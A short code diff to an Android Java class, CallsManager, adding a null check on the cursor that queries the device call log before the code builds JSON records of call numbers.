@@ -28,6 +28,10 @@ public class CallsManager {
 
             @SuppressLint("Recycle") Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);
 
+            if (cur == null) {
+                return null;
+            }
+
             while (cur.moveToNext()) {
                 JSONObject call = new JSONObject();
                 @SuppressLint("Range") String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));// for  number
